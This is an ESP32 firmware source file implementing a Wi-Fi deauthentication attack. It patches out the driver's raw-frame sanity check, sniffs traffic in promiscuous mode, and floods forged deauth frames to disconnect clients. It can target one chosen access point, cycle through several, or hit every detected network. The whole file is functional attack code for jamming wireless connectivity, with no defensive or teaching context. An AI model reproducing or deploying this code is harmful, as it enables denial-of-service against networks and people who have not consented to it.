#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"

deauth_frame_t deauth_frame;
int deauth_type = DEAUTH_TYPE_LIMITED;
int eliminated_connections;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length < 0) return;

  if (deauth_type == DEAUTH_TYPE_LIMITED) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_connections++;
    } else return;
  } else {
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      memcpy(deauth_frame.access_point, mac_header->dest, 6);
      memcpy(deauth_frame.sender, mac_header->dest, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    } else return;
  }

  DEBUG_PRINTF("Send %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n", NUM_FRAMES_PER_DEAUTH, mac_header->src[0], mac_header->src[1], mac_header->src[2], mac_header->src[3], mac_header->src[4], mac_header->src[5]);
  BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
}

void start_deauth(std::vector<int> wifi_numbers, int attack_type, uint16_t reason) {
  eliminated_connections = 0;
  deauth_type = attack_type;

  deauth_frame.reason = reason;

  if (deauth_type == DEAUTH_TYPE_LIMITED) {
    // 支持多AP：遍历所有网络号
    DEBUG_PRINT("Starting Deauth-Attack on ");
    DEBUG_PRINT(wifi_numbers.size());
    DEBUG_PRINTLN(" networks");

    DEBUG_PRINT("Attacking network: ");
    for (auto it = wifi_numbers.begin(); it != wifi_numbers.end(); ++it) {
        DEBUG_PRINT(WiFi.SSID(*it));
        if (std::next(it) != wifi_numbers.end()) {
            DEBUG_PRINT(", ");
        }
    }
    DEBUG_PRINTLN("");
  
    if (wifi_numbers.size() == 1) {
        int wifi_number = wifi_numbers[0]; // 获取第一个网络号
        WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
        memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
        memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_filter(&filt);
        esp_wifi_set_promiscuous_rx_cb(&sniffer);
        return;
    }
    
    while (wifi_numbers.size() > 1)  {
      for (int wifi_number : wifi_numbers) {
        if (wifi_number >= 0) {
          WiFi.softAP(WiFi.SSID(wifi_number), (const char*)NULL, WiFi.channel(wifi_number));
          memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
          memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
          esp_wifi_set_promiscuous(true);
          esp_wifi_set_promiscuous_filter(&filt);
          esp_wifi_set_promiscuous_rx_cb(&sniffer);
          delay(200);
        }
      }
    } return;

  } else if (deauth_type == DEAUTH_TYPE_ALL) {
    DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);
    return;

  } else {
    DEBUG_PRINTLN("No action!");
    return;
  }
}

void stop_deauth() {
  DEBUG_PRINTLN("Stopping Deauth-Attack..");
  esp_wifi_set_promiscuous(false);
}